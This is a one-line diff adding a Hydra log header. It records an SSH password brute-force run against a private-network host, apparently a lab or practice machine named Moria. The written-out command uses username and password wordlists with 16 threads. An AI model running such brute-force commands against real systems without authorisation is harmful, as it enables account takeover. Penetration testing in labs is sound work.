@@ -1,0 +1,1 @@
+# Hydra v8.6 run at 2017-10-02 16:13:45 on 192.168.2.89 ssh (hydra -s 22 -o /tmp/sparta-_cFVUO-running/hydra/20171002161335-192.168.2.89-22-ssh.txt -L /root/Downloads/Moria/usernames.txt -P /root/Downloads/Moria/passwords.txt -e ns -u -f -t 16 192.168.2.89 ssh)
